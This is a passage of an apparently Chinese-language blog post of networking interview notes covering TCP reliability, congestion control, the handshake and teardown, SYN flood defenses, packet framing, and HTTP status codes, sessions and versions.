<li>通过路由表查映射关系</li>
<li>查到了就按照映射关系从我的指定端口发出去（不在任何一个子网范围，走其路由器的默认网关也是查到了）</li>
<li>查不到则返回一个路由不可达的数据包</li>
</ul>
<h2 id="TCP和UDP的区别"><a href="#TCP和UDP的区别" class="headerlink" title="TCP和UDP的区别"></a>TCP和UDP的区别</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848403.jpg" alt="TCP、UDP协议的区别"></p>
<h2 id="TCP-协议如何保证可靠传输"><a href="#TCP-协议如何保证可靠传输" class="headerlink" title="TCP 协议如何保证可靠传输"></a>TCP 协议如何保证可靠传输</h2><ol>
<li><p>应用数据被分割成TCP认为最适合发送的数据块。 </p>
</li>
<li><p>TCP给发送的每一个包进行编号，接收方对数据包进行排序，把有序数据传送给应用层。 </p>
</li>
<li><p><strong>校验和：</strong> TCP将保持它首部和数据的检验和。这是一个端到端的检验和，目的是检测数据在传输过程中的任何变化。如果收到段的检验和有差错，TCP 将丢弃这个报文段和不确认收到此报文段。 </p>
</li>
<li><p>TCP 的接收端会丢弃重复的数据。 </p>
</li>
<li><p><strong>流量控制：</strong> TCP 连接的每一方都有固定大小的缓冲空间，TCP的接收端只允许发送端发送接收端缓冲区能接纳的数据。当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。TCP 使用的流量控制协议是可变大小的滑动窗口协议。 （TCP 利用滑动窗口实现流量控制）</p>
</li>
<li><p><strong>拥塞控制：</strong> 当网络拥塞时，减少数据的发送。(慢开始,拥塞避免,快重传,快恢复)</p>
<p>慢开始:简单的说,开始传输时,传输的数据由小到大递增到一个值(即发送窗口由小到大(指数增长)逐渐增大到拥塞窗口的数值).<br>拥塞避免:数据发送出去,并收到接收方发回来的确认收到,拥塞窗口每次值加1地线性增大.<br>快重传:数据传输时(数据被分成报文,每个报文都有个序号),中间的一部分丢失接收方没收到,接收方连续接到后面的数据,则发回对丢失前的数据的重复确认,这样发送方就知道有部分数据丢失了,于是从丢失处重传数据.<br>快恢复:快恢复是与快重传配合的算法,在发生数据丢失时,发送方收到接收方发回的三个重复确认信息时,就把每次传输的数据量减为原来的一半,拥塞窗口也修改为这个值,然后又开始拥塞避免的算法.</p>
</li>
<li><p><strong>ARQ协议：</strong> 也是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组。</p>
</li>
<li><p><strong>超时重传：</strong> 当TCP发出一个段后，它启动一个定时器，等待目的端确认收到这个报文段。如果不能及时收到一个确认，将重发这个报文段。</p>
</li>
</ol>
<h3 id="ARQ协议"><a href="#ARQ协议" class="headerlink" title="ARQ协议"></a>ARQ协议</h3><p><strong>自动重传请求</strong>（Automatic Repeat-reQuest，ARQ）是OSI模型中数据链路层和传输层的错误纠正协议之一。它通过使用确认和超时这两个机制，在不可靠服务的基础上实现可靠的信息传输。如果发送方在发送后一段时间之内没有收到确认帧，它通常会重新发送。ARQ包括停止等待ARQ协议和连续ARQ协议。</p>
<h4 id="停止等待ARQ协议"><a href="#停止等待ARQ协议" class="headerlink" title="停止等待ARQ协议"></a>停止等待ARQ协议</h4><p>停止等待协议是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认（回复ACK）。如果过了一段时间（超时时间后），还是没有收到 ACK 确认，说明没有发送成功，需要重新发送，直到收到确认后再发下一个分组。</p>
<p>在停止等待协议中，若接收方收到重复分组，就丢弃该分组，但同时还要发送确认。</p>
<p><strong>优缺点：</strong></p>
<ul>
<li><strong>优点：</strong> 简单</li>
<li><strong>缺点：</strong> 信道利用率低，等待时间长</li>
</ul>
<p><strong>1) 无差错情况:</strong></p>
<p>发送方发送分组,接收方在规定时间内收到,并且回复确认.发送方再次发送。</p>
<p><strong>2) 出现差错情况（超时重传）:</strong></p>
<p>停止等待协议中超时重传是指只要超过一段时间仍然没有收到确认，就重传前面发送过的分组（认为刚才发送过的分组丢失了）。因此每发送完一个分组需要设置一个超时计时器，其重传时间应比数据在分组传输的平均往返时间更长一些。这种自动重传方式常称为 <strong>自动重传请求 ARQ</strong> 。另外在停止等待协议中若收到重复分组，就丢弃该分组，但同时还要发送确认。<strong>连续 ARQ 协议</strong> 可提高信道利用率。发送维持一个发送窗口，凡位于发送窗口内的分组可连续发送出去，而不需要等待对方确认。接收方一般采用累积确认，对按序到达的最后一个分组发送确认，表明到这个分组位置的所有分组都已经正确收到了。</p>
<p><strong>3) 确认丢失和确认迟到</strong></p>
<ul>
<li><strong>确认丢失</strong> ：确认消息在传输过程丢失。当A发送M1消息，B收到后，B向A发送了一个M1确认消息，但却在传输过程中丢失。而A并不知道，在超时计时过后，A重传M1消息，B再次收到该消息后采取以下两点措施：1. 丢弃这个重复的M1消息，不向上层交付。 2. 向A发送确认消息。（不会认为已经发送过了，就不再发送。A能重传，就证明B的确认消息丢失）。</li>
<li><strong>确认迟到</strong> ：确认消息在传输过程中迟到。A发送M1消息，B收到并发送确认。在超时时间内没有收到确认消息，A重传M1消息，B仍然收到并继续发送确认消息（B收到了2份M1）。此时A收到了B第二次发送的确认消息。接着发送其他数据。过了一会，A收到了B第一次发送的对M1的确认消息（A也收到了2份确认消息）。处理如下：1. A收到重复的确认后，直接丢弃。2. B收到重复的M1后，也直接丢弃重复的M1。</li>
</ul>
<h4 id="连续ARQ协议"><a href="#连续ARQ协议" class="headerlink" title="连续ARQ协议"></a>连续ARQ协议</h4><p>连续 ARQ 协议可提高信道利用率。发送方维持一个发送窗口，凡位于发送窗口内的分组可以连续发送出去，而不需要等待对方确认。接收方一般采用累计确认，对按序到达的最后一个分组发送确认，表明到这个分组为止的所有分组都已经正确收到了。</p>
<p><strong>优缺点：</strong></p>
<ul>
<li><strong>优点：</strong> 信道利用率高，容易实现，即使确认丢失，也不必重传。</li>
<li><strong>缺点：</strong> 不能向发送方反映出接收方已经正确收到的所有分组的信息。 比如：发送方发送了 5条消息，中间第三条丢失（3号），这时接收方只能对前两个发送确认。发送方无法知道后三个分组的下落，而只好把后三个全部重传一次。这也叫 Go-Back-N（回退 N），表示需要退回来重传已经发送过的 N 个消息。</li>
</ul>
<h3 id="滑动窗口和流量控制"><a href="#滑动窗口和流量控制" class="headerlink" title="滑动窗口和流量控制"></a>滑动窗口和流量控制</h3><p><strong>TCP 利用滑动窗口实现流量控制。流量控制是为了控制发送方发送速率，保证接收方来得及接收。</strong> 接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。</p>
<h3 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h3><p>在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。这种情况就叫拥塞。拥塞控制就是为了防止过多的数据注入到网络中，这样就可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。拥塞控制是一个全局性的过程，涉及到所有的主机，所有的路由器，以及与降低网络传输性能有关的所有因素。相反，流量控制往往是点对点通信量的控制，是个端到端的问题。流量控制所要做到的就是抑制发送端发送数据的速率，以便使接收端来得及接收。</p>
<p>为了进行拥塞控制，TCP 发送方要维持一个 <strong>拥塞窗口(cwnd)</strong> 的状态变量。拥塞控制窗口的大小取决于网络的拥塞程度，并且动态变化。发送方让自己的发送窗口取为拥塞窗口和接收方的接受窗口中较小的一个。</p>
<p>TCP的拥塞控制采用了四种算法，即 <strong>慢开始</strong> 、 <strong>拥塞避免</strong> 、<strong>快重传</strong> 和 <strong>快恢复</strong>。在网络层也可以使路由器采用适当的分组丢弃策略（如主动队列管理 AQM），以减少网络拥塞的发生。</p>
<ul>
<li><strong>慢开始：</strong> 慢开始算法的思路是当主机开始发送数据时，如果立即把大量数据字节注入到网络，那么可能会引起网络阻塞，因为现在还不知道网络的符合情况。经验表明，较好的方法是先探测一下，即由小到大逐渐增大发送窗口，也就是由小到大逐渐增大拥塞窗口数值。cwnd初始值为1，每经过一个传播轮次，cwnd加倍。</li>
<li><strong>拥塞避免：</strong> 拥塞避免算法的思路是让拥塞窗口cwnd缓慢增大，即每经过一个往返时间RTT就把发送方的cwnd加1.</li>
<li><strong>快重传与快恢复：</strong> 在 TCP&#x2F;IP 中，快速重传和恢复（fast retransmit and recovery，FRR）是一种拥塞控制算法，它能快速恢复丢失的数据包。没有FRR，如果数据包丢失了，TCP 将会使用定时器来要求传输暂停。在暂停的这段时间内，没有新的或复制的数据包被发送。有了 FRR，如果接收机接收到一个不按顺序的数据段，它会立即给发送机发送一个重复确认。如果发送机接收到三个重复确认，它会假定确认件指出的数据段丢失了，并立即重传这些丢失的数据段。有了 FRR，就不会因为重传时要求的暂停被耽误。 　当有单独的数据包丢失时，快速重传和恢复（FRR）能最有效地工作。当有多个数据信息包在某一段很短的时间内丢失时，它则不能很有效地工作。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848407.png" alt="img"></p>
<h2 id="TCP三次握手和四次挥手"><a href="#TCP三次握手和四次挥手" class="headerlink" title="TCP三次握手和四次挥手"></a>TCP三次握手和四次挥手</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848423.jpeg" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848427.png" alt="img"></p>
<p>第一次握手：建立连接时，客户端发送syn包（seq&#x3D;x）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。</p>
<p>第二次握手：服务器收到syn包，必须确认客户的SYN（ack&#x3D;x+1），同时自己也发送一个SYN包（seq&#x3D;y），即SYN+ACK包，此时服务器进入SYN_RECV状态；</p>
<p>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack&#x3D;y+1, seq &#x3D; x + 1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。</p>
<p>四次挥手过程理解 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848497.png" alt="img"></p>
<p>1）客户端进程发出连接释放报文，并且停止发送数据。释放数据报文首部，FIN&#x3D;1，其序列号为seq&#x3D;u（等于前面已经传送过来的数据的最后一个字节的序号加1），此时，客户端进入FIN-WAIT-1（终止等待1）状态。 TCP规定，FIN报文段即使不携带数据，也要消耗一个序号。<br>2）服务器收到连接释放报文，发出确认报文，ACK&#x3D;1，ack&#x3D;u+1，并且带上自己的序列号seq&#x3D;v，此时，服务端就进入了CLOSE-WAIT（关闭等待）状态。TCP服务器通知高层的应用进程，客户端向服务器的方向就释放了，这时候处于半关闭状态，即客户端已经没有数据要发送了，但是服务器若发送数据，客户端依然要接受。这个状态还要持续一段时间，也就是整个CLOSE-WAIT状态持续的时间。<br>3）客户端收到服务器的确认请求后，此时，客户端就进入FIN-WAIT-2（终止等待2）状态，等待服务器发送连接释放报文（在这之前还需要接受服务器发送的最后的数据）。<br>4）服务器将最后的数据发送完毕后，就向客户端发送连接释放报文，FIN&#x3D;1，ack&#x3D;u+1，由于在半关闭状态，服务器很可能又发送了一些数据，假定此时的序列号为seq&#x3D;w，此时，服务器就进入了LAST-ACK（最后确认）状态，等待客户端的确认。<br>5）客户端收到服务器的连接释放报文后，必须发出确认，ACK&#x3D;1，ack&#x3D;w+1，而自己的序列号是seq&#x3D;u+1，此时，客户端就进入了TIME-WAIT（时间等待）状态。注意此时TCP连接还没有释放，必须经过2MSL（最长报文段寿命）的时间后，当客户端撤销相应的TCB后，才进入CLOSED状态。<br>6）服务器只要收到了客户端发出的确认，立即进入CLOSED状态。同样，撤销TCB后，就结束了这次的TCP连接。可以看到，服务器结束TCP连接的时间要比客户端早一些。</p>
<h3 id="为什么关闭连接的需要四次挥手，而建立连接却只要三次握手呢？"><a href="#为什么关闭连接的需要四次挥手，而建立连接却只要三次握手呢？" class="headerlink" title="为什么关闭连接的需要四次挥手，而建立连接却只要三次握手呢？"></a>为什么关闭连接的需要四次挥手，而建立连接却只要三次握手呢？</h3><p>为什么要断开连接,因为端口号有限;</p>
<p>关闭连接时，被动断开方在收到对方的FIN结束请求报文时，很可能业务数据没有发送完成，并不能立即关闭连接，被动方只能先回复一个ACK响应报文，告诉主动断开方：“你发的FIN报文我收到了，只有等到我所有的业务报文都发送完了，我才能真正的结束，在结束之前，我会发你FIN+ACK报文的，你先等着”。所以，被动断开方的确认报文，需要拆开成为两步，故总体就需要四步挥手。</p>
<p>而在建立连接场景中，Server端的应答可以稍微简单一些。当Server端收到Client端的SYN连接请求报文后，其中ACK报文表示对请求报文的应答，SYN报文用来表示服务端的连接也已经同步开启了，而ACK报文和SYN报文之间，不会有其他报文需要发送，故而可以合二为一，可以直接发送一个SYN+ACK报文。所以，在建立连接时，只需要三次握手即可。</p>
<h3 id="为什么连接建立的时候是三次握手，可以改成两次握手吗？"><a href="#为什么连接建立的时候是三次握手，可以改成两次握手吗？" class="headerlink" title="为什么连接建立的时候是三次握手，可以改成两次握手吗？"></a>为什么连接建立的时候是三次握手，可以改成两次握手吗？</h3><p>三次握手完成两个重要的功能：一是双方都做好发送数据的准备工作，而且双方都知道对方已准备好；二是双方完成初始SN序列号的协商，双方的SN序列号在握手过程中被发送和确认。</p>
<p>如果把三次握手改成两次握手，可能发生死锁。</p>
<p>在假想的TCP建立的连接时二次握手过程中，Client发送Server发送一个SYN请求帧，Server收到后发送了确认应答SYN+ACK帧。按照两次握手的协定，Server认为连接已经成功地建立了，可以开始发送数据帧。这个过程中，如果确认应答SYN+ACK帧在传输中被丢失，Client没有收到，Client将不知道Server是否已准备好，也不知道Server的SN序列号，Client认为连接还未建立成功，将忽略Server发来的任何数据分组，会一直等待Server的SYN+ACK确认应答帧。而Server在发出的数据帧后，一直没有收到对应的ACK确认后就会产生超时，重复发送同样的数据帧。这样就形成了死锁。</p>
<h3 id="为什么主动断开方在TIME-WAIT状态必须等待2MSL的时间？"><a href="#为什么主动断开方在TIME-WAIT状态必须等待2MSL的时间？" class="headerlink" title="为什么主动断开方在TIME-WAIT状态必须等待2MSL的时间？"></a>为什么主动断开方在TIME-WAIT状态必须等待2MSL的时间？</h3><p>原因之一：主动断开方等待2MSL的时间，是为了确保两端都能最终关闭。假设网络是不可靠的，被动断开方发送FIN+ACK报文后，其主动方的ACK响应报文有可能丢失，这时候的被动断开方处于LAST-ACK状态的，由于收不到ACK确认被动方一直不能正常的进入CLOSED状态。在这种场景下，被动断开方会超时重传FIN+ACK断开响应报文，如果主动断开方在2MSL时间内，收到这个重传的FIN+ACK报文，会重传一次ACK报文，后再一次重新启动2MSL计时等待，这样，就能确保被动断开方能收到ACK报文，从而能确保被动方顺利进入到CLOSED状态。只有这样，双方都能够确保关闭。反过来说，如果主动断开方在发送完ACK响应报文后，不是进入TIME_WAIT状态去等待2MSL时间，而是立即释放连接，则将无法收到被动方重传的FIN+ACK报文，所以不会再发送一次ACK确认报文，此时处于LAST-ACK状态的被动断开方，无法正常进入到CLOSED状态。</p>
<p>原因之二：防止“旧连接的已失效的数据报文”出现在新连接中。主动断开方在发送完最后一个ACK报文后，再经过2MSL，才能最终关闭和释放端口，这就意味着，相同端口的新TCP新连接，需要在2MSL的时间之后，才能够正常的建立。2MSL这段时间内，旧连接所产生的所有数据报文，都已经从网络中消失了，从而，确保了下一个新的连接中不会出现这种旧连接请求报文。</p>
<h3 id="如果已经建立了连接，但是Client端突然出现故障了怎么办？"><a href="#如果已经建立了连接，但是Client端突然出现故障了怎么办？" class="headerlink" title="如果已经建立了连接，但是Client端突然出现故障了怎么办？"></a>如果已经建立了连接，但是Client端突然出现故障了怎么办？</h3><p>TCP还设有一个保活计时器，Client端如果出现故障，Server端不能一直等下去，这样会浪费系统资源。每收到一次Client客户端的数据帧后，Server端的保活计时器会复位。计时器的超时时间通常是设置为2小时，若2小时还没有收到Client端的任何数据帧，Server端就会发送一个探测报文段，以后每隔75秒钟发送一次。若一连发送10个探测报文仍然没反应，Server端就认为Client端出了故障，接着就关闭连接。如果觉得保活计时器的两个多小时的间隔太长，可以自行调整TCP连接的保活参数。</p>
<h3 id="Syn洪泛攻击"><a href="#Syn洪泛攻击" class="headerlink" title="Syn洪泛攻击"></a>Syn洪泛攻击</h3><p>A（攻击者）发送TCP SYN，SYN是TCP三次握手中的第一个数据包，而当这个服务器返回ACK以后，A不再进行确认，那这个连接就处在了一个挂起的状态，也就是半连接的意思，那么服务器收不到再确认的一个消息，还会重复发送ACK给A。这样一来就会更加浪费服务器的资源。A就对服务器发送非法大量的这种TCP连接，由于每一个都没法完成握手的机制，所以它就会消耗服务器的内存最后可能导致服务器死机，就无法正常工作了。更进一步说，如果这些半连接的握手请求是恶意程序发出，并且持续不断，那么就会导致服务端较长时间内丧失服务功能——这样就形成了DoS攻击。这种攻击方式就称为SYN泛洪攻击。</p>
<p>那么我们如何去防范这种SYN攻击呢？</p>
<p>其实最常用的一个手段就是优化主机系统设置。比如降低SYN timeout时间，使得主机尽快释放半连接的占用或者采用SYN cookie设置，如果短时间内收到了某个IP的重复SYN请求，我们就认为受到了攻击。我们合理的采用防火墙设置等外部网络也可以进行拦截。</p>
<h2 id="什么是粘包和半包？"><a href="#什么是粘包和半包？" class="headerlink" title="什么是粘包和半包？"></a>什么是粘包和半包？</h2><p>半包是指只收到了全包的一部分.</p>
<p>在进行 Java NIO 学习时，可能会发现：如果客户端连续不断的向服务端发送数据包时，服务端接收的数据会出现两个数据包粘在一起的情况。</p>
<ol>
<li><p>TCP是基于字节流的，虽然应用层和 TCP 传输层之间的数据交互是大小不等的数据块，但是TCP把这些数据块仅仅看成一连串无结构的字节流，没有边界；</p>
</li>
<li><p>从TCP的帧结构也可以看出，在TCP的首部没有表示数据长度的字段。</p>
</li>
</ol>
<p>基于上面两点，在使用TCP传输数据时，才有粘包或者拆包现象发生的可能。一个数据包中包含了发送端发送的两个数据包的信息，这种现象即为粘包。</p>
<p>接收端收到了两个数据包，但是这两个数据包要么是不完整的，要么就是多出来一块，这种情况即发生了拆包和粘包。拆包和粘包的问题导致接收端在处理的时候会非常困难，因为无法区分一个完整的数据包。</p>
<h2 id="TCP-粘包是怎么产生的？"><a href="#TCP-粘包是怎么产生的？" class="headerlink" title="TCP 粘包是怎么产生的？"></a>TCP 粘包是怎么产生的？</h2><ul>
<li><strong>发送方产生粘包</strong></li>
</ul>
<p>采用 TCP 协议传输数据的客户端与服务器经常是保持一个长连接的状态（一次连接发一次数据不存在粘包），双方在连接不断开的情况下，可以一直传输数据。但当发送的数据包过于的小时，那么 TCP 协议默认的会启用 Nagle 算法，将这些较小的数据包进行合并发送（缓冲区数据发送是一个堆压的过程）；这个合并过程就是在发送缓冲区中进行的，也就是说数据发送出来它已经是粘包的状态了。</p>
<ul>
<li><strong>接收方产生粘包</strong></li>
</ul>
<p>接收方采用 TCP 协议接收数据时的过程是这样的：数据到接收方，从网络模型的下方传递至传输层，传输层的 TCP 协议处理是将其放置接收缓冲区，然后由应用层来主动获取（C 语言用 recv、read 等函数）；这时会出现一个问题，就是我们在程序中调用的读取数据函数不能及时的把缓冲区中的数据拿出来，而下一个数据又到来并有一部分放入的缓冲区末尾，等我们读取数据时就是一个粘包。（放数据的速度 &gt; 应用层拿数据速度）</p>
<h2 id="怎么解决拆包和粘包？"><a href="#怎么解决拆包和粘包？" class="headerlink" title="怎么解决拆包和粘包？"></a>怎么解决拆包和粘包？</h2><p>分包机制一般有两个通用的解决方法：</p>
<ol>
<li><p>特殊字符控制；</p>
</li>
<li><p>在包头首都添加数据包的长度。</p>
</li>
</ol>
<p>如果使用 netty 的话，就有专门的编码器和解码器解决拆包和粘包问题了。</p>
<p>tips：UDP 没有粘包问题，但是有丢包和乱序。不完整的包是不会有的，收到的都是完全正确的包。传送的数据单位协议是 UDP 报文或用户数据报，发送的时候既不合并，也不拆分。</p>
<h2 id="在浏览器中输入url地址-gt-gt-显示主页的过程"><a href="#在浏览器中输入url地址-gt-gt-显示主页的过程" class="headerlink" title="在浏览器中输入url地址 -&gt;&gt; 显示主页的过程"></a>在浏览器中输入url地址 -&gt;&gt; 显示主页的过程</h2><p>图解（图片来源：《图解HTTP》）：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848898.jpg" alt="img"></p>
<blockquote>
<p>上图有一个错误，请注意，是OSPF不是OPSF。 OSPF（Open Shortest Path First，ospf）开放最短路径优先协议,是由Internet工程任务组开发的路由选择协议</p>
</blockquote>
<p>总体来说分为以下几个过程:</p>
<ol>
<li>DNS解析</li>
<li>TCP连接</li>
<li>发送HTTP请求</li>
<li>服务器处理请求并返回HTTP报文</li>
<li>浏览器解析渲染页面</li>
<li>连接结束</li>
</ol>
<h5 id="DNS负载均衡CDN技术"><a href="#DNS负载均衡CDN技术" class="headerlink" title="DNS负载均衡CDN技术"></a>DNS负载均衡CDN技术</h5><p>DNS返回的IP地址是否每次都一样？如果每次都一样是否说明你请求的资源都位于同一台机器上面，那么这台机器需要多高的性能和储存才能满足亿万请求呢？其实真实的互联网世界背后存在成千上百台服务器，大型的网站甚至更多。但是在用户的眼中，它需要的只是处理他的请求，哪台机器处理请求并不重要。DNS可以返回一个合适的机器的IP给用户，例如可以根据每台机器的负载量，该机器离用户地理位置的距离等等，这种过程就是DNS负载均衡，又叫做DNS重定向。大家耳熟能详的CDN(Content Delivery Network)就是利用DNS的重定向技术，DNS服务器会返回一个跟用户最接近的点的IP地址给用户，CDN节点的服务器负责响应用户的请求，提供所需的内容。在这里打个免费的广告，我平时使用的比较多的是七牛云的CDN(免费)储存图片，作为我个人博客的图床使用</p>
<p>具体可以参考下面这篇文章：</p>
<ul>
<li><a href="https://segmentfault.com/a/1190000006879700">https://segmentfault.com/a/1190000006879700</a></li>
</ul>
<h2 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h2><p>200： 请求被服务器端正常处理</p>
<p>204 no content：服务器端已成功处理请求，但是在返回的响应报文中不含实体的主体内容。浏览器显示的页面不发生更新。</p>
<p>206 partial content：表示服务器端成功执行了范围请求，响应报文中包含由 Content-Range 指定范围的实体内容。</p>
<p>3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。</p>
<p>301：永久性重定向。</p>
<p>302：临时性重定向。</p>
<p>303：表示该请求对应的资源存在着另一个URI，应使用 get 方法定向获取请求的资源。</p>
<p>307: 只能重定向到https</p>
<p>4XX 客户端错误</p>
<p>400：客户端请求报文中存在语法错误</p>
<p>401：需要认证信息或认证失败。第一次返回表示需要认证信息，第二次表示认证失败。</p>
<p>403：禁止访问，没有访问权限。看视频+博客</p>
<p>404：服务器端没有找到请求资源</p>
<p>5XX 服务器错误</p>
<p>500 ：服务器处理请求发生错误</p>
<p>502 : 网关错误</p>
<p>503：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</p>
<h2 id="各种协议与HTTP协议之间的关系"><a href="#各种协议与HTTP协议之间的关系" class="headerlink" title="各种协议与HTTP协议之间的关系"></a>各种协议与HTTP协议之间的关系</h2><p>一般面试官会通过这样的问题来考察你对计算机网络知识体系的理解。</p>
<p>图片来源：《图解HTTP》</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848912.png" alt="各种协议与HTTP协议之间的关系"></p>
<h2 id="HTTP长连接-短连接"><a href="#HTTP长连接-短连接" class="headerlink" title="HTTP长连接,短连接"></a>HTTP长连接,短连接</h2><p>在HTTP&#x2F;1.0中默认使用短连接。也就是说，客户端和服务器每进行一次HTTP操作，就建立一次连接，任务结束就中断连接。当客户端浏览器访问的某个HTML或其他类型的Web页中包含有其他的Web资源（如JavaScript文件、图像文件、CSS文件等），每遇到这样一个Web资源，浏览器就会重新建立一个HTTP会话。</p>
<p>而从HTTP&#x2F;1.1起，默认使用长连接，用以保持连接特性。使用长连接的HTTP协议，会在响应头加入这行代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Connection:keep-aliveCopy to clipboardErrorCopied</span><br></pre></td></tr></table></figure>

<p>在使用长连接的情况下，当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，客户端再次访问这个服务器时，会继续使用这一条已经建立的连接。Keep-Alive不会永久保持连接，它有一个保持时间，可以在不同的服务器软件（如Apache）中设定这个时间。实现长连接需要客户端和服务端都支持长连接。</p>
<p><strong>HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。</strong></p>
<p>—— <a href="https://www.cnblogs.com/gotodsp/p/6366163.html">《HTTP长连接、短连接究竟是什么？》</a></p>
<h2 id="HTTP是不保存状态的协议-如何保存用户状态"><a href="#HTTP是不保存状态的协议-如何保存用户状态" class="headerlink" title="HTTP是不保存状态的协议,如何保存用户状态?"></a>HTTP是不保存状态的协议,如何保存用户状态?</h2><p>HTTP 是一种不保存状态，即无状态（stateless）协议。也就是说 HTTP 协议自身不对请求和响应之间的通信状态进行保存。那么我们保存用户状态呢？Session 机制的存在就是为了解决这个问题，Session 的主要作用就是通过服务端记录用户的状态。典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的 Session 之后就可以标识这个用户并且跟踪这个用户了（一般情况下，服务器会在一定时间内保存这个 Session，过了时间限制，就会销毁这个Session）。</p>
<p>在服务端保存 Session 的方法很多，最常用的就是内存和数据库(比如是使用内存数据库redis保存)。既然 Session 存放在服务器端，那么我们如何实现 Session 跟踪呢？大部分情况下，我们都是通过在 Cookie 中附加一个 Session ID 来方式来跟踪。</p>
<p><strong>Cookie 被禁用怎么办?</strong></p>
<p>最常用的就是利用 URL 重写把 Session ID 直接附加在URL路径的后面。</p>
<h2 id="Cookie的作用是什么-和Session有什么区别？"><a href="#Cookie的作用是什么-和Session有什么区别？" class="headerlink" title="Cookie的作用是什么?和Session有什么区别？"></a>Cookie的作用是什么?和Session有什么区别？</h2><p>Cookie 和 Session都是用来跟踪浏览器用户身份的会话方式，但是两者的应用场景不太一样。</p>
<p><strong>Cookie 一般用来保存用户信息</strong> 比如①我们在 Cookie 中保存已经登录过得用户信息，下次访问网站的时候页面可以自动帮你登录的一些基本信息给填了；②一般的网站都会有保持登录也就是说下次你再访问网站的时候就不需要重新登录了，这是因为用户登录的时候我们可以存放了一个 Token 在 Cookie 中，下次登录的时候只需要根据 Token 值来查找用户即可(为了安全考虑，重新登录一般要将 Token 重写)；③登录一次网站后访问网站其他页面不需要重新登录。<strong>Session 的主要作用就是通过服务端记录用户的状态。</strong> 典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的 Session 之后就可以标识这个用户并且跟踪这个用户了。</p>
<p>Cookie 数据保存在客户端(浏览器端)，Session 数据保存在服务器端。</p>
<p>Cookie 存储在客户端中，而Session存储在服务器上，相对来说 Session 安全性更高。如果要在 Cookie 中存储一些敏感信息，不要直接写入 Cookie 中，最好能将 Cookie 信息加密然后使用到的时候再去服务器端解密。</p>
<h2 id="HTTP和TCP的区别"><a href="#HTTP和TCP的区别" class="headerlink" title="HTTP和TCP的区别"></a>HTTP和TCP的区别</h2><p>http协议是超文本传输协议，是应用层协议，http协议是建立在tcp协议之上的。http协议的特点是客户端发送请求都需要服务端回应，在请求结束后，会主动释放链接。从建立连接到关闭连接的过程称为‘一次连接’。</p>
<h2 id="HTTP-1-0-1-1-2-0-3-0-的特点及其区别"><a href="#HTTP-1-0-1-1-2-0-3-0-的特点及其区别" class="headerlink" title="HTTP 1.0 1.1 2.0 3.0 的特点及其区别"></a>HTTP 1.0 1.1 2.0 3.0 的特点及其区别</h2><h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP 1.0"></a>HTTP 1.0</h3><p>HTTP1.0最早在网页中使用是在1996年，那个时候只是使用一些较为简单的网页上和网络请求上</p>
<p>1.0的HTTP版本，是一种无状态，无连接的应用层协议。 HTTP1.0规定浏览器和服务器保持短暂的链接。</p>
<p>浏览器每次请求都需要与服务器建立一个TCP连接，服务器处理完成以后立即断开TCP连接(无连接)，服务器不跟踪也每个客户单，也不记录过去的请求(无状态)。</p>
<p>这种无状态性可以借助cookie&#x2F;session机制来做身份认证和状态记录。</p>
<h4 id="HTTP1-0存在的问题"><a href="#HTTP1-0存在的问题" class="headerlink" title="HTTP1.0存在的问题"></a>HTTP1.0存在的问题</h4><h5 id="无法复用连接"><a href="#无法复用连接" class="headerlink" title="无法复用连接"></a>无法复用连接</h5><p>每次发送请求，都需要进行一次TCP连接，而TCP的连接释放过程又是比较费事的。这种无连接的特性会使得网络的利用率变低。</p>
<h5 id="队头阻塞-head-of-line-blocking"><a href="#队头阻塞-head-of-line-blocking" class="headerlink" title="队头阻塞(head of line blocking)"></a>队头阻塞(head of line blocking)</h5><p>由于HTTP1.0规定下一个请求必须在前一个请求响应到达之前才能发送，假设前一个请求响应一直不到达，那么下一个请求就不发送，后面的请求就阻塞了。</p>
<h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP 1.1"></a>HTTP 1.1</h3><p>HTTP1.1在1999年才开始广泛应用于现在的各大浏览器网络请求中，同时HTTP1.1也是当前使用最为广泛的HTTP协议。</p>
<p>HTTP1.1继承了HTTP1.0的简单，克服了HTTP1.0性能上的问题。</p>
<p><strong>长连接</strong></p>
<p>HTTP1.1增加Connection字段，通过设置Keep-Alive保持HTTP连接不断卡。避免每次客户端与服务器请求都要重复建立释放建立TCP连接。提高了网络的利用率。</p>
